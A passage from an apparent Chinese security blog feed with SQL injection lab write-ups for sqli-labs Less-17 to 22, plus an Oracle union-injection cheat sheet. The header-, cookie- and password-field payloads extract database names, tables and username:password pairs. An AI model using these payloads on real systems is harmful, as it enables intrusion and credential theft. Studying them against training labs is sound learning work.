keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> user_tables <span class="token keyword">where</span> rownum<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> table_name <span class="token operator">not</span> <span class="token operator">in</span> <span class="token punctuation">(</span><span class="token string">'第一个表'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>爆字段:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> user_tab_columns <span class="token keyword">where</span> rownum<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">'表名（大写的）'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> user_tab_columns <span class="token keyword">where</span> rownum<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">'表名'</span> <span class="token operator">and</span> column_name <span class="token operator">not</span> <span class="token operator">in</span> <span class="token punctuation">(</span><span class="token string">'第一个字段'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>爆数据:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>字段<span class="token number">1</span><span class="token operator">||</span>字段<span class="token number">2.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">||</span>字段n <span class="token keyword">from</span> 表名 <span class="token keyword">where</span> rownum<span class="token operator">=</span><span class="token number">1</span> <span class="token comment">--</span>连接多个字段用到的连接符号是<span class="token operator">||</span><span class="token punctuation">,</span>在oracle数据库中，concat函数只能连接两个字符串<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>通过字段名查找对应的表：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> owner<span class="token punctuation">,</span> table_name <span class="token keyword">FROM</span> all_tab_columns <span class="token keyword">WHERE</span> column_name <span class="token operator">LIKE</span> <span class="token string">'%USERNAME%'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其盲注语句和OOB等，参考文章：<a href="https://www.cnblogs.com/R0ser1/p/15387539.html">https://www.cnblogs.com/R0ser1/p/15387539.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 信息搜集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息搜集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>POST注入-HTTP头注入</title>
      <link href="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><h5 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h5><p>HTTP头中的参数带入到数据库被执行，造成了HTTP头注入。</p><h3 id="SERVER详解"><a href="#SERVER详解" class="headerlink" title="$_SERVER详解"></a>$_SERVER详解</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SCRIPT_NAME'</span><span class="token punctuation">]</span>          <span class="token comment">//当前脚本的路径</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SCRIPT_NAME'</span><span class="token punctuation">]</span>  <span class="token comment">//dirname() 返回路径中的目录部分</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SCRIPT_FILENAME'</span><span class="token punctuation">]</span>      <span class="token comment">//当前脚本执行的绝对路径</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_HOST'</span><span class="token punctuation">]</span>            <span class="token comment">//获取当前域名</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SERVER_NAME'</span><span class="token punctuation">]</span>          <span class="token comment">//输出配置文件httpd.conf中的ServerName，一般情况下与HTTP_HOST值相同</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SystemRoot'</span><span class="token punctuation">]</span>           <span class="token comment">//当前服务器的操作系统的目录</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SERVER_SOFTWARE'</span><span class="token punctuation">]</span>      <span class="token comment">//服务器软件配置信息</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SERVER_PORT'</span><span class="token punctuation">]</span>          <span class="token comment">//服务器端口</span><span class="token variable">$_SERVER</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_PORT'</span><span class="token punctuation">]</span>         <span class="token comment">//用户连接到服务器时所使用的端口</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SERVER_ADDR'</span><span class="token punctuation">]</span>          <span class="token comment">//服务器的ip地址</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span>          <span class="token comment">//浏览网页的用户ip。</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'DOCUMENT_ROOT'</span><span class="token punctuation">]</span>        <span class="token comment">//当前运行脚本所在的根目录</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_SCHEME'</span><span class="token punctuation">]</span>       <span class="token comment">//服务器通信协议，是http或https。</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SERVER_ADMIN'</span><span class="token punctuation">]</span>         <span class="token comment">//服务器管理员信息</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span>       <span class="token comment">//请求数据的方式</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_URI'</span><span class="token punctuation">]</span>          <span class="token comment">//当前脚本路径，根目录之后的目录</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'PHP_SELF'</span><span class="token punctuation">]</span>             <span class="token comment">//当前正在执行脚本的文件名</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_TIME'</span><span class="token punctuation">]</span>         <span class="token comment">//得到请求开始时的时间戳。</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_COOKIE'</span><span class="token punctuation">]</span>          <span class="token comment">//获取浏览器的cookie信息。</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_CONNECTION'</span><span class="token punctuation">]</span>      <span class="token comment">//当前请求的连接情况</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span>      <span class="token comment">//获取用户相关信息，包括用户浏览器、操作系统等信息</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_ACCEPT'</span><span class="token punctuation">]</span>          <span class="token comment">//当前请求的ACCEPT头部信息</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_ACCEPT_LANGUAGE'</span><span class="token punctuation">]</span> <span class="token comment">//返回用户默认的语言设置，后面的q值表示用户对该语言的喜好程度</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x01（useragent注入）"><a href="#0x01（useragent注入）" class="headerlink" title="0x01（useragent注入）"></a>0x01（useragent注入）</h2><p><strong>Less-18</strong></p><p>查看源码可知有以下注意点：</p><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205214039033.png" alt="image-20220205214039033"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span>      <span class="token comment">//获取用户相关信息，包括用户浏览器、操作系统等信息</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span>          <span class="token comment">//浏览网页的用户ip。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>由于对uname和passwd进行了check_input()函数处理，导致在这两个字段上注入时不行的：</p><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205214350305.png" alt="image-20220205214350305"></p><p>但在源码中有了Insert字段，可以从这里入手。</p><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205220615022.png" alt="image-20220205220615022"></p><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205220601734.png" alt="image-20220205220601734"></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>先尝试<code>admin</code>和<code>admin</code>登录，页面返回<code>User Agent</code>信息，由此在HTTP头里进行<code>User Agent</code>字段注入</p><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205222503023.png" alt="image-20220205222503023"></p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>抓包改包：</p><p>抓包后将<code>User Agent</code>随便添加了几个字符，页面也同样返回了几个字符：</p><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205222953053.png" alt="image-20220205222953053"></p><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205223005987.png" alt="image-20220205223005987"></p><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205223022658.png" alt="image-20220205223022658"></p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>爆库：</p><pre class="line-numbers language-none"><code class="language-none">User-Agent: &#39;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205223434243.png" alt="image-20220205223434243"></p><pre class="line-numbers language-none"><code class="language-none">$insert&#x3D;&quot;INSERT INTO &#96;security&#96;.&#96;uagents&#96; (&#96;uagent&#96;, &#96;ip_address&#96;, &#96;username&#96;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>and</code>前的<code>&#39;</code>是将<code>&#39;$uagent&#39;</code>中的前<code>&#39;</code>进行闭合，使用<code>or &#39;1&#39;=&#39;1</code>将<code>&#39;$uagent&#39;</code>后面的<code>&#39;</code>闭合；</p><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205225102107.png" alt="image-20220205225102107"></p><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205225118423.png" alt="image-20220205225118423"></p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>爆版本号：</p><pre class="line-numbers language-none"><code class="language-none">&#39;and extractvalue(1,concat(0x7e,(select version()),0x7e)) and &#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205225349977.png" alt="image-20220205225349977"></p><h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><p>在爆表名的时候由于一个地方不知道什么原因试了很久，记录一下：</p><p>这里一开始注入的是以下语句：</p><pre class="line-numbers language-none"><code class="language-none">User-Agent: &#39;and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e)) and &#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>页面没有爆出表；</p><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205234603717.png" alt="image-20220205234603717"></p><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205234615471.png" alt="image-20220205234615471"></p><p>当把<code>and</code>改成<code>or</code>才爆出表名：</p><pre class="line-numbers language-none"><code class="language-none">User-Agent: &#39;or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e)) and &#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205234819705.png" alt="image-20220205234819705"></p><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205234826888.png" alt="image-20220205234826888"></p><p>这里进行了一个实验，应该是出现上述情况的原因：</p><p>注入语句用<code>and</code>连接的话，单引号闭合之后形成的是<code>&#39;&#39;</code>代表空值，而后面的<code>extractvalue()</code>查询到结果为真，也就是1，在mysql中实验如图：</p><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220205235435928.png" alt="image-20220205235435928"></p><p>空值和1<code>and</code>完之后为0，可能导致数据库不返回报错信息，导致没有爆出表名。</p><h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><p>爆字段：</p><pre class="line-numbers language-none"><code class="language-none">User-Agent: &#39;or extractvalue(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 4,1),0x7e)) and &#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206000302280.png" alt="image-20220206000302280"></p><pre class="line-numbers language-none"><code class="language-none">User-Agent: &#39;or extractvalue(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 5,1),0x7e)) and &#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206000402501.png" alt="image-20220206000402501"></p><h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><p>爆内容：</p><pre class="line-numbers language-none"><code class="language-none">User-Agent: &#39;or extractvalue(1,concat(0x7e,(select concat(username,&#39;:&#39;,password) from users limit 0,1),0x7e)) and &#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206000602759.png" alt="image-20220206000602759"></p><hr><h2 id="0x01（referer注入）"><a href="#0x01（referer注入）" class="headerlink" title="0x01（referer注入）"></a>0x01（referer注入）</h2><p><strong>Less-19</strong></p><p><em>HTTP Referer是<a href="https://baike.baidu.com/item/header/688992">header</a>的一部分，当<a href="https://baike.baidu.com/item/%E6%B5%8F%E8%A7%88%E5%99%A8/213911">浏览器</a>向web<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8">服务器</a>发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。</em></p><p>首先输入<code>admin</code>和<code>admin</code>页面返回Referer信息，据此可知19关的思路应该是 Referer注入。</p><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206223214033.png" alt="image-20220206223214033"></p><h2 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h2><p>抓包后随便修改Referer值页面返回同样是修改后的内容：</p><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206223703891.png" alt="image-20220206223703891"></p><h2 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h2><p>爆库名：</p><pre class="line-numbers language-none"><code class="language-none">Referer: &#39; or extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;1&#39; &#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206224350236.png" alt="image-20220206224350236"></p><p>爆表名：</p><pre class="line-numbers language-none"><code class="language-none">Referer: &#39; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() limit 0,1),0x7e)) and &#39;1&#39; &#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆字段：</p><pre class="line-numbers language-none"><code class="language-none">Referer: &#39; or extractvalue(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 4,1),0x7e)) and &#39;1&#39; &#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">Referer: &#39; or extractvalue(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 5,1),0x7e)) and &#39;1&#39; &#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆内容：</p><pre class="line-numbers language-none"><code class="language-none">Referer: &#39; or extractvalue(1,concat(0x7e,(select concat(username,&#39;:&#39;,password) from users limit 0,1),0x7e)) and &#39;1&#39; &#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="0x01（Cookie注入）"><a href="#0x01（Cookie注入）" class="headerlink" title="0x01（Cookie注入）"></a>0x01（Cookie注入）</h2><p><strong>Less-20</strong></p><p>从源码分析如下：</p><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206230125585.png" alt="image-20220206230125585"></p><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206230141836.png" alt="image-20220206230141836"></p><p> <code>$_COOKIE</code>接收到<code>username</code>的值后将会带入数据库查询，从这可以进行注入。</p><h2 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h2><p>首先进行正常输入<code>admin</code>和<code>admin</code>看一下回显页面：</p><p>根据以上分析在<code>cookie</code>进行报错注入。</p><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206232324785.png" alt="image-20220206232324785"></p><h2 id="0x03-2"><a href="#0x03-2" class="headerlink" title="0x03"></a>0x03</h2><p>记录一下踩得坑：</p><p>这里抓包之后添加<code>Cookie：uname=admin</code>后使用POST方式提交的话返回异常回显：<img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206231743882.png" alt="image-20220206231743882"></p><p>该成GET方式提交回显正常：</p><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206232500745.png" alt="image-20220206232500745"></p><p>爆库名：</p><pre class="line-numbers language-none"><code class="language-none">Cookie: uname&#x3D;admin&#39; or extractvalue(1,concat(0x7e,(select database()),0x7e))#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206232706475.png" alt="image-20220206232706475"></p><p>后续过程与Less-19相同，同样也可以使用其他注入。</p><hr><p>##0x01（Cookie注入-base64）</p><p>从源码分析得知，与Less-20不同的是，Less-21对<code>uname</code>字段进行了base64加密：</p><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206233854877.png" alt="image-20220206233854877"></p><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206233952173.png" alt="image-20220206233952173"></p><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220206235141632.png" alt="image-20220206235141632"></p><p>这里其实是：<code>$_COOKIE</code>获取到<code>uname</code>字段的内容后先进行了<strong>base64_encode</strong>，提交表单之后又进行了<strong>base64_decode</strong>，最后将解密后的<code>cookie</code>代入数据库查询，最后又进行了<strong>base64_encode</strong>。由此可知，在注入的时候要先要进行一次<strong>base64_encode</strong>，思路大概就是这样。</p><p><strong>这里还需注意一个点：此处的cookie值进行了<code>&#39;)</code>处理，导致开始注入的时候老是报语法错误。</strong></p><h2 id="0x02-3"><a href="#0x02-3" class="headerlink" title="0x02"></a>0x02</h2><p>先抓包，然后进行<code>cookie</code>加密注入：</p><p>探测一下字段数，有3个字段：</p><pre class="line-numbers language-none"><code class="language-none">Cookie: uname&#x3D;YWRtaW4nKSBvcmRlciBieSA0Iw&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220207001749683.png" alt="image-20220207001749683"></p><p>联合注入爆库，爆版本号：</p><pre class="line-numbers language-none"><code class="language-none">Cookie: uname&#x3D;LWFkbWluJykgdW5pb24gc2VsZWN0IDEsZGF0YWJhc2UoKSx2ZXJzaW9uKCkj<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220207002221359.png" alt="image-20220207002221359"></p><p>爆表名：</p><pre class="line-numbers language-none"><code class="language-none">Cookie: uname&#x3D;LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpIw&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220207002533567.png" alt="image-20220207002533567"></p><p>爆字段：</p><pre class="line-numbers language-none"><code class="language-none">Cookie: uname&#x3D;LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0ndXNlcnMnIw&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220207003331834.png" alt="image-20220207003331834"></p><p>爆内容：</p><pre class="line-numbers language-none"><code class="language-none">uname&#x3D;LWFkbWluJykgdW5pb24gc2VsZWN0IDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lKSxncm91cF9jb25jYXQocGFzc3dvcmQpIGZyb20gc2VjdXJpdHkudXNlcnMj<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220207002804799.png" alt="image-20220207002804799"></p><p>Less-21最关键的就在于<strong>base64</strong>加解密的注入。</p><h2 id="0x01（Cookie注入）-1"><a href="#0x01（Cookie注入）-1" class="headerlink" title="0x01（Cookie注入）"></a>0x01（Cookie注入）</h2><p><strong>Less-22</strong></p><p>这里只有编码注入的时候注意<code>&quot;</code>就OK：</p><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/image-20220207003837052.png" alt="image-20220207003837052"></p><p>其他payload与Less-21相同。</p>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>POST注入--基于Password的注入</title>
      <link href="/2022/02/05/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/02/05/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>说实话，看到的时候挺吃惊的，没见过，试了很多payload，都注不进去，它还嘲讽我：</p><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220205134905162.png" alt="image-20220205134905162"></p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>查了一下资料，又看了一下源码发现<code>username</code>已经不能被注入了，原因是源码将<code>uname</code>字段进行了检查，导致<code>uname</code>不能够构造payload进行注入。</p><p>（check_input()中，对 username 进行各种转义的处理）</p><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220205135439584.png" alt="image-20220205135439584"></p><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220205135454717.png" alt="image-20220205135454717"></p><p>源码当中还遇到<code>update</code>进行了密码更新，以至于<code>passwd</code>字段可以进行构造payload：</p><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220205140047399.png" alt="image-20220205140047399"></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>而执行以下语句时报错：</p><pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin  &amp;passwd&#x3D;1&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220205140447561.png" alt="image-20220205140447561"></p><p>探测注入点：</p><pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin  &amp;passwd&#x3D;1&#39; or 1&#x3D;1 #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>登录成功。</p><p><img 